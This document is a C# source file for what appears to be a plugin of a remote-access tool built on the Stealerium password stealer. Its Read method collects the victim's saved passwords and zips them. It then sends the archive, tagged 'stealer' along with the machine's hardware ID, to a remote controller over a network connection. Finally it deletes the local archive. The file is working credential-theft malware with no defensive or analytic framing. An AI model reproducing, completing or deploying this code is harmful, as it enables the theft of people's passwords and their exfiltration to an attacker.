using MessagePackLib.MessagePack;
using Stealerium.Helpers;
using System;
using System.IO;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object packet)
        {
            try
            {
                string savedir = Stealerium.Target.Passwords.Save();
                string zipfilearchive = Filemanager.CreateArchive(savedir, false);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Pac_ket").AsString = "stealer";
                msgpack.ForcePathObject("zip").SetAsBytes(File.ReadAllBytes(zipfilearchive));
                Connection.Send(msgpack.Encode2Bytes());

                File.Delete(zipfilearchive);
            }
            catch (Exception ex)
            {
                Logging.Log($"{ex.Message}\n {ex.StackTrace} \n{ex.Source}");
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}